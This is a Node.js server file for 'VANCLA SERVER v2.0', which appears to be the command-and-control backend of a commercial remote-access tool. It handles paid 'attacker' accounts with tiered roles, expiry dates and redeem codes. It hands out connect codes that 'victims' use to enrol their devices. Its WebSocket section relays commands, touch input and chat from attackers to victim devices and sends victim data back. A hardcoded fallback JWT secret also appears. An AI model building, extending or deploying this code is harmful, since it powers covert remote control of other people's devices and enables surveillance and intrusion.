const express   = require('express');
const http      = require('http');
const WebSocket = require('ws');
const bcrypt    = require('bcryptjs');
const jwt       = require('jsonwebtoken');
const { v4: uuid } = require('uuid');
const cors      = require('cors');
const path      = require('path');
const { get: DBget, update: DBupdate, ROLES } = require('./db');

const app    = express();
const server = http.createServer(app);
const wss    = new WebSocket.Server({ server });
const PORT   = process.env.PORT   || 3000;
const SECRET = process.env.JWT_SECRET || 'vancla-2025-secret';

// ── ROLE CONFIG ──────────────────────────────────────
const ROLE_CODE_LIMITS = {
  basic:9, pro:6, premium:10, vip:20, vvip:35,
  tk:45, owner:55, high_owner:70, developer:9999
};

const DEV_CONFIG = {
  tk:         { allowedRoles:['basic','pro','premium'],                   maxDays:10, dailyLimit:5  },
  owner:      { allowedRoles:['basic','pro','premium','vip'],             maxDays:20, dailyLimit:10 },
  high_owner: { allowedRoles:['basic','pro','premium','vip','vvip'],      maxDays:35, dailyLimit:25 },
  developer:  { allowedRoles:null, maxDays:null, dailyLimit:null }
};

const ADMIN_ROLES = ['tk','owner','high_owner','developer'];

app.use(cors());
app.use(express.json({ limit:'50mb' }));
app.get('/owner',     (req,res) => res.sendFile(path.join(__dirname,'login.html')));
app.get('/dashboard', (req,res) => res.sendFile(path.join(__dirname,'dashboard.html')));

const attackers        = new Map();
const victims          = new Map();
const acceptedSessions = new Map();
const disconnectTimers = new Map();
const log = m => console.log(`[${new Date().toLocaleTimeString()}] ${m}`);

// ── HELPERS ──────────────────────────────────────────
function todayStr(){ return new Date().toDateString(); }
function countTodayCodes(db, attackerId){
  return db.connect_codes.filter(c =>
    c.attacker_id === attackerId && new Date(c.created_at).toDateString() === todayStr()
  ).length;
}
function countTodayUsers(db, creatorId){
  return db.attackers.filter(a =>
    a.created_by === creatorId && a.created_at && new Date(a.created_at).toDateString() === todayStr()
  ).length;
}

// ── AUTH ─────────────────────────────────────────────
function auth(req,res,next){
  const t=(req.headers.authorization||'').replace('Bearer ','');
  if(!t)return res.json({success:false,message:'Token required'});
  try{req.user=jwt.verify(t,SECRET);next();}
  catch(e){res.json({success:false,message:'Token invalid'});}
}
function adminOnly(req,res,next){
  auth(req,res,()=>{
    if(!ADMIN_ROLES.includes(req.user.role))
      return res.json({success:false,message:'Akses ditolak'});
    next();
  });
}
function devOnly(req,res,next){
  auth(req,res,()=>{
    if(req.user.role!=='developer')
      return res.json({success:false,message:'Hanya developer'});
    next();
  });
}

// ════════════════════════════════════════════════════
// OWNER / ADMIN ROUTES
// ════════════════════════════════════════════════════
app.post('/api/owner/login',(req,res)=>{
  const {username,password}=req.body;
  if(username!=='VANCLA2026')return res.json({success:false,message:'Invalid credentials'});
  const db=DBget();
  if(!bcrypt.compareSync(password,db.owner_hash))return res.json({success:false,message:'Invalid credentials'});
  const token=jwt.sign({id:'owner',role:'owner_web',username:'VANCLA2026'},SECRET,{expiresIn:'24h'});
  res.json({success:true,token});
});

app.get('/api/owner/stats',adminOnly,(req,res)=>{
  const db=DBget();
  const rc={};ROLES.forEach(r=>{rc[r]=0;});
  db.attackers.forEach(a=>{if(rc[a.role]!==undefined)rc[a.role]++;});
  res.json({success:true,total_attackers:db.attackers.length,online_attackers:attackers.size,online_victims:victims.size,total_codes:db.connect_codes.length,total_redeem:db.redeem_codes.length,role_counts:rc});
});

app.get('/api/owner/attackers',adminOnly,(req,res)=>{
  const db=DBget();
  const caller=req.user;
  const cfg=DEV_CONFIG[caller.role];
  let list=db.attackers;
  // TK/OWNER/HIGH_OWNER only see their created accounts
  if(caller.role!=='developer'){
    list=list.filter(a=>a.created_by===caller.id||a.id===caller.id);
  }
  res.json({success:true,attackers:list.map(a=>({id:a.id,username:a.username,role:a.role,created_at:a.created_at,expires_at:a.expires_at,banned:a.banned,ban_reason:a.ban_reason||'',online:attackers.has(a.id)}))});
});

app.post('/api/owner/attackers',adminOnly,(req,res)=>{
  const {username,password,role,days}=req.body;
  if(!username||!password||!role)return res.json({success:false,message:'Missing fields'});
  const caller=req.user;
  const cfg=DEV_CONFIG[caller.role];

  // Role restriction
  if(cfg&&cfg.allowedRoles&&!cfg.allowedRoles.includes(role)){
    return res.json({success:false,message:`Role ${role} tidak diizinkan untuk ${caller.role}`});
  }
  // Max days restriction
  const daysInt=parseInt(days)||30;
  if(cfg&&cfg.maxDays!==null&&daysInt>cfg.maxDays){
    return res.json({success:false,message:`Maksimal ${cfg.maxDays} hari untuk role ${caller.role}`});
  }
  // Daily limit
  if(cfg&&cfg.dailyLimit!==null){
    const db=DBget();
    const today=countTodayUsers(db,caller.id);
    if(today>=cfg.dailyLimit){
      return res.json({success:false,message:`Batas harian ${cfg.dailyLimit} akun sudah tercapai`});
    }
  }
  if(!ROLES.includes(role))return res.json({success:false,message:'Invalid role'});

  DBupdate(db=>{
    if(db.attackers.find(a=>a.username===username))
      return res.json({success:false,message:'Username sudah dipakai'});
    const exp=days?new Date(Date.now()+daysInt*86400000).toISOString():null;
    db.attackers.push({id:uuid(),username,password:bcrypt.hashSync(password,10),role,created_at:new Date().toISOString(),expires_at:exp,banned:false,ban_reason:'',created_by:caller.id});
    res.json({success:true,message:'Akun berhasil dibuat'});
  });
});

app.put('/api/owner/attackers/:id/role',adminOnly,(req,res)=>{
  const {role}=req.body;
  const caller=req.user;
  const cfg=DEV_CONFIG[caller.role];
  if(cfg&&cfg.allowedRoles&&!cfg.allowedRoles.includes(role))
    return res.json({success:false,message:`Role ${role} tidak diizinkan`});
  if(!ROLES.includes(role))return res.json({success:false,message:'Invalid role'});
  DBupdate(db=>{
    const a=db.attackers.find(x=>x.id===req.params.id);
    if(!a)return res.json({success:false,message:'Not found'});
    a.role=role;res.json({success:true});
    const conn=attackers.get(a.id);if(conn)conn.ws.send(JSON.stringify({type:'role_updated',role}));
  });
});

app.put('/api/owner/attackers/:id/ban',adminOnly,(req,res)=>{
  const {banned,reason}=req.body;
  DBupdate(db=>{
    const a=db.attackers.find(x=>x.id===req.params.id);
    if(!a)return res.json({success:false});
    a.banned=!!banned;a.ban_reason=reason||'';
    res.json({success:true,message:banned?'Akun dibanned':'Akun diunban'});
    if(banned){const c=attackers.get(a.id);if(c){c.ws.send(JSON.stringify({type:'banned',reason}));c.ws.close();}}
  });
});

app.put('/api/owner/attackers/:id/extend',adminOnly,(req,res)=>{
  const caller=req.user;
  const cfg=DEV_CONFIG[caller.role];
  const days=parseInt(req.body.days)||0;
  if(cfg&&cfg.maxDays!==null&&days>cfg.maxDays)
    return res.json({success:false,message:`Maksimal ${cfg.maxDays} hari`});
  DBupdate(db=>{
    const a=db.attackers.find(x=>x.id===req.params.id);
    if(!a)return res.json({success:false});
    const base=a.expires_at?new Date(Math.max(new Date(a.expires_at),new Date())):new Date();
    base.setDate(base.getDate()+days);a.expires_at=base.toISOString();
    res.json({success:true,expires_at:a.expires_at});
  });
});

app.put('/api/owner/attackers/:id/password',adminOnly,(req,res)=>{
  DBupdate(db=>{
    const a=db.attackers.find(x=>x.id===req.params.id);
    if(!a)return res.json({success:false});
    a.password=bcrypt.hashSync(req.body.password,10);res.json({success:true});
  });
});

app.delete('/api/owner/attackers/:id',adminOnly,(req,res)=>{
  DBupdate(db=>{
    const idx=db.attackers.findIndex(x=>x.id===req.params.id);
    if(idx===-1)return res.json({success:false});
    db.attackers.splice(idx,1);res.json({success:true});
  });
});

// Redeem — ONLY developer
app.get('/api/owner/redeem',adminOnly,(req,res)=>{
  if(req.user.role!=='developer')return res.json({success:false,message:'Hanya developer'});
  res.json({success:true,codes:DBget().redeem_codes});
});
app.post('/api/owner/redeem',devOnly,(req,res)=>{
  const {type,days,target_role,max_uses,custom_code}=req.body;
  DBupdate(db=>{
    const rc={id:uuid(),code:custom_code||Math.random().toString(36).substr(2,8).toUpperCase(),type:type||'duration',days:parseInt(days)||30,target_role:target_role||null,max_uses:parseInt(max_uses)||1,used_count:0,created_at:new Date().toISOString(),active:true};
    db.redeem_codes.push(rc);res.json({success:true,code:rc});
  });
});
app.delete('/api/owner/redeem/:id',devOnly,(req,res)=>{
  DBupdate(db=>{const idx=db.redeem_codes.findIndex(x=>x.id===req.params.id);if(idx!==-1)db.redeem_codes.splice(idx,1);res.json({success:true});});
});

// ════════════════════════════════════════════════════
// ATTACKER ROUTES
// ════════════════════════════════════════════════════
app.post('/api/attacker/login',(req,res)=>{
  const {username,password}=req.body;
  const db=DBget();
  const a=db.attackers.find(x=>x.username===username);
  if(!a)return res.json({success:false,message:'Username tidak ditemukan'});
  if(a.banned)return res.json({success:false,banned:true,message:'Akun dibanned: '+(a.ban_reason||'-')});
  if(a.expires_at&&new Date(a.expires_at)<new Date())return res.json({success:false,expired:true,message:'Akun expired'});
  if(!bcrypt.compareSync(password,a.password))return res.json({success:false,message:'Password salah'});
  const token=jwt.sign({id:a.id,role:a.role,username:a.username},SECRET,{expiresIn:'12h'});
  const days_left=a.expires_at?Math.max(0,Math.floor((new Date(a.expires_at)-new Date())/86400000)):99999;
  const needs2fa=a.role==='developer'&&!!a.twofa;
  res.json({success:true,token,role:a.role,username:a.username,days_left,needs2fa});
});

app.post('/api/attacker/verify2fa',(req,res)=>{
  const {token,code}=req.body;
  try{
    const user=jwt.verify(token,SECRET);
    const db=DBget();
    const a=db.attackers.find(x=>x.id===user.id);
    if(!a||!a.twofa)return res.json({success:false,message:'2FA tidak diperlukan'});
    if(a.twofa!==code)return res.json({success:false,message:'Kode 2FA salah'});
    const newToken=jwt.sign({id:a.id,role:a.role,username:a.username,twofa:true},SECRET,{expiresIn:'12h'});
    res.json({success:true,token:newToken,role:a.role,username:a.username});
  }catch(e){res.json({success:false,message:'Token invalid'});}
});

app.post('/api/attacker/codes', auth, (req, res) => {
  const db = DBget();
  const attacker = db.attackers.find(x => x.id === req.user.id);
  if (!attacker) return res.json({ success: false, message: 'Not found' });

  const limit = ROLE_CODE_LIMITS[attacker.role] || 3;

  // FIX BUG 2: gunakan counter terpisah, TIDAK dari array connect_codes
  // Counter hanya naik, tidak turun saat kode dihapus
  const today = new Date().toDateString();
  if (!attacker.daily_codes) attacker.daily_codes = {};
  const todayCount = attacker.daily_codes[today] || 0;

  if (todayCount >= limit) {
    return res.json({
      success: false,
      message: `Limit harian ${limit} kode sudah tercapai`,
      limit_reached: true, limit, used: todayCount
    });
  }

  DBupdate(db => {
    const a = db.attackers.find(x => x.id === req.user.id);
    if (!a.daily_codes) a.daily_codes = {};
    const t = new Date().toDateString();
    // Increment permanent counter
    a.daily_codes[t] = (a.daily_codes[t] || 0) + 1;

    let code, tries = 0;
    do {
      code = Math.floor(100000 + Math.random() * 900000).toString();
      tries++;
    } while (db.connect_codes.find(c => c.code === code) && tries < 100);

    const c = {
      id: uuid(), code,
      attacker_id: req.user.id,
      attacker_username: req.user.username,
      created_at: new Date().toISOString(),
      expires_at: new Date(Date.now() + 24 * 3600000).toISOString()
    };
    db.connect_codes.push(c);
    const newUsed = a.daily_codes[t];
    res.json({ success: true, code, expires_at: c.expires_at, used: newUsed, limit });
  });
});

app.get('/api/attacker/codes',auth,(req,res)=>{
  const db=DBget(),now=new Date();
  const limit=ROLE_CODE_LIMITS[req.user.role]||3;
  const used=countTodayCodes(db,req.user.id);
  res.json({success:true,limit,used,remaining:Math.max(0,limit-used),codes:db.connect_codes.filter(c=>c.attacker_id===req.user.id).map(c=>({...c,active:new Date(c.expires_at)>now}))});
});

app.delete('/api/attacker/codes/:code',auth,(req,res)=>{
  DBupdate(db=>{db.connect_codes=db.connect_codes.filter(c=>!(c.code===req.params.code&&c.attacker_id===req.user.id));res.json({success:true});});
});

app.post('/api/attacker/redeem',auth,(req,res)=>{
  const {code}=req.body;
  DBupdate(db=>{
    const rc=db.redeem_codes.find(x=>x.code===code&&x.active&&x.used_count<x.max_uses);
    if(!rc)return res.json({success:false,message:'Kode tidak valid'});
    const a=db.attackers.find(x=>x.id===req.user.id);
    if(!a)return res.json({success:false});
    if(rc.type==='duration'){const base=a.expires_at?new Date(Math.max(new Date(a.expires_at),new Date())):new Date();base.setDate(base.getDate()+rc.days);a.expires_at=base.toISOString();}
    else if(rc.type==='upgrade'&&rc.target_role){if(ROLES.indexOf(rc.target_role)<=ROLES.indexOf(a.role))return res.json({success:false,message:'Role sudah lebih tinggi'});a.role=rc.target_role;}
    rc.used_count++;if(rc.used_count>=rc.max_uses)rc.active=false;
    res.json({success:true,message:'Redeem berhasil!',role:a.role,expires_at:a.expires_at});
  });
});

// ════════════════════════════════════════════════════
// VICTIM ROUTES
// ════════════════════════════════════════════════════
app.post('/api/victim/validate',(req,res)=>{
  const {code}=req.body;
  const db=DBget();
  const c=db.connect_codes.find(x=>x.code===code&&new Date(x.expires_at)>new Date());
  if(!c)return res.json({success:false,message:'Kode tidak valid atau expired'});
  const a=db.attackers.find(x=>x.id===c.attacker_id);
  if(!a||a.banned)return res.json({success:false,message:'Kode tidak valid'});
  res.json({success:true,attacker_role:a.role});
});

// ════════════════════════════════════════════════════
// WEBSOCKET (same as before — unchanged)
// ════════════════════════════════════════════════════
wss.on('connection',ws=>{
  ws.isAlive=true;ws.role=null;ws.userId=null;ws.victimId=null;ws.attackerId=null;
  ws.on('pong',()=>{ws.isAlive=true;});
  ws.on('message',data=>{
    let msg;try{msg=JSON.parse(data.toString());}catch(_){return;}
    if(msg.type==='attacker_connect'){
      try{
        const user=jwt.verify(msg.token,SECRET);
        const db=DBget();
        const a=db.attackers.find(x=>x.id===user.id);
        if(!a||a.banned||(a.expires_at&&new Date(a.expires_at)<new Date())){ws.send(JSON.stringify({type:'auth_error',message:'Akun tidak valid'}));ws.close();return;}
        ws.role='attacker';ws.userId=user.id;
        attackers.set(user.id,{ws,role:a.role,username:a.username});
        const av=[];victims.forEach((v,id)=>{if(v.attackerId===user.id&&!v.pending)av.push({victimId:id,deviceInfo:v.deviceInfo});});
        ws.send(JSON.stringify({type:'connected',role:a.role,username:a.username,victims:av}));
        victims.forEach((v,id)=>{if(v.attackerId===user.id&&v.pending)ws.send(JSON.stringify({type:'victim_pending',victimId:id,deviceInfo:v.deviceInfo,code:v.code}));});
      }catch(e){ws.send(JSON.stringify({type:'auth_error',message:'Token invalid'}));ws.close();}
      return;
    }
    if(msg.type==='victim_connect'){
      const db=DBget();
      const c=db.connect_codes.find(x=>x.code===msg.code&&new Date(x.expires_at)>new Date());
      if(!c){ws.send(JSON.stringify({type:'code_invalid',message:'Kode tidak valid'}));ws.close();return;}
      const prev=acceptedSessions.get(msg.code);
      let vid,isRecon=false;
      if(prev&&prev.attackerId===c.attacker_id){vid=prev.victimId;isRecon=true;if(disconnectTimers.has(vid)){clearTimeout(disconnectTimers.get(vid));disconnectTimers.delete(vid);}}
      else{vid='V'+uuid().substr(0,8).toUpperCase();}
      ws.role='victim';ws.victimId=vid;ws.attackerId=c.attacker_id;
      victims.set(vid,{ws,attackerId:c.attacker_id,code:msg.code,deviceInfo:msg.deviceInfo||{},pending:!isRecon});
      if(isRecon){ws.send(JSON.stringify({type:'connection_accepted',victimId:vid}));const ac=attackers.get(c.attacker_id);if(ac&&ac.ws.readyState===WebSocket.OPEN)ac.ws.send(JSON.stringify({type:'victim_reconnected',victimId:vid,deviceInfo:msg.deviceInfo||{}}));}
      else{ws.send(JSON.stringify({type:'code_valid',victimId:vid}));const ac=attackers.get(c.attacker_id);if(ac&&ac.ws.readyState===WebSocket.OPEN)ac.ws.send(JSON.stringify({type:'victim_pending',victimId:vid,deviceInfo:msg.deviceInfo||{},code:msg.code}));}
      return;
    }
    if(ws.role==='attacker'&&msg.type==='add_victim'){const v=victims.get(msg.victimId);if(!v||v.attackerId!==ws.userId)return;v.pending=false;acceptedSessions.set(v.code,{victimId:msg.victimId,attackerId:ws.userId});ws.send(JSON.stringify({type:'victim_added',victimId:msg.victimId,deviceInfo:v.deviceInfo}));v.ws.send(JSON.stringify({type:'connection_accepted'}));return;}
    if(ws.role==='attacker'&&msg.type==='reject_victim'){const v=victims.get(msg.victimId);if(v){v.ws.send(JSON.stringify({type:'connection_rejected'}));victims.delete(msg.victimId);}return;}
    if(ws.role==='attacker'){const v=victims.get(msg.targetId);if(!v||v.attackerId!==ws.userId||v.ws.readyState!==WebSocket.OPEN){ws.send(JSON.stringify({type:'victim_offline',victimId:msg.targetId}));return;}if(['command','touch','chat'].includes(msg.type))v.ws.send(JSON.stringify(msg));return;}
    if(ws.role==='victim'){const ac=attackers.get(ws.attackerId);if(!ac||ac.ws.readyState!==WebSocket.OPEN)return;if(msg.type==='chat'&&msg.sender==='victim'){ac.ws.send(JSON.stringify({type:'chat_vic',text:msg.text,sourceId:ws.victimId}));return;}ac.ws.send(JSON.stringify({...msg,sourceId:ws.victimId}));}
  });
  ws.on('close',()=>{
    if(ws.role==='attacker'){attackers.delete(ws.userId);}
    if(ws.role==='victim'&&ws.victimId){const vid=ws.victimId,aid=ws.attackerId;const t=setTimeout(()=>{const cur=victims.get(vid);if(cur&&cur.ws===ws){victims.delete(vid);const ac=attackers.get(aid);if(ac&&ac.ws.readyState===WebSocket.OPEN)ac.ws.send(JSON.stringify({type:'victim_offline',victimId:vid}));}disconnectTimers.delete(vid);},15000);disconnectTimers.set(vid,t);}
  });
  ws.on('error',e=>log(`WS ERR: ${e.message}`));
});
setInterval(()=>{wss.clients.forEach(ws=>{if(!ws.isAlive){ws.terminate();return;}ws.isAlive=false;ws.ping();});},25000);
app.get('*',(req,res)=>res.json({service:'VANCLA SERVER v2.0',status:'online',victims:victims.size,attackers:attackers.size}));
server.listen(PORT,'0.0.0.0',()=>log(`VANCLA Server port ${PORT}`));
